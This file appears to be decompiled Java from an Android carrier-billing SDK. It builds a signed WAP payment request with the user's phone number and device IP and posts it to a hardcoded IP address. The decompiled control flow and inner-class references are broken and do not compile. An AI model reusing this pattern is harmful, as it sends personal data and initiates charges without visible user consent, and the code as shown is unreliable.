package com.upay.billing.engine.rdowap;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Handler;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Trade;
import com.upay.billing.utils.HttpRunner;
import com.upay.billing.utils.Util;
import java.util.List;

@SuppressLint({"HandlerLeak"})
public class RdoWapPayTask
{
  private static final int RDOWAPFAIL = 2;
  private static final int RDOWAPSUCC = 1;
  private String charge_request;
  private List<Cmd> cmds;
  private String exec_request;
  private Context mContext;
  private Handler mHandler = new RdoWapPayTask.1(this);
  private Trade mTrade;
  
  public RdoWapPayTask(Context paramContext, Trade paramTrade, List<Cmd> paramList)
  {
    this.mContext = paramContext;
    this.mTrade = paramTrade;
    this.cmds = paramList;
  }
  
  public static String getAmount(String paramString)
  {
    return String.valueOf(Integer.valueOf(paramString).intValue() * 100);
  }
  
  public void rdoWapPay()
  {
    String str2 = ((Cmd)this.cmds.get(0)).msg.replace("$serialNo", this.mTrade.id + "01");
    String str3 = str2.substring(0, 3);
    String str4 = Util.getUnixTime();
    String str1 = Util.getString(this.mContext, "mymobile");
    if ((str1 != null) && (!"".equals(str1))) {}
    for (;;)
    {
      String str5 = Util.md5(RdoConstant.rdoCreateSign(this.mContext, getAmount(String.valueOf(this.mTrade.price)), str2, str4, "wap", str1, str3));
      Util.addTask(new RdoWapPayTask.2(this, RdoConstant.rdoCreateUrl).setDoPost().addParam("amount", getAmount(String.valueOf(this.mTrade.price))).addParam("app_id", "1000008").addParam("app_orderid", str2).addParam("ch_id", str3).addParam("ch_type", "1").addParam("corp_type", "1").addParam("ip", Util.getIp(this.mContext)).addParam("noti_url", "http://117.135.131.209:808/xiyuerdo/noti_url.php").addParam("ret_url", "http://117.135.131.209:808/xiyuerdo/noti_url.php").addParam("scheme", "2").addParam("site_type", "1").addParam("time", str4).addParam("user_id", str1).addParam("ver", "1.0").addParam("sign", str5));
      return;
      str1 = this.mTrade.id;
    }
  }
}
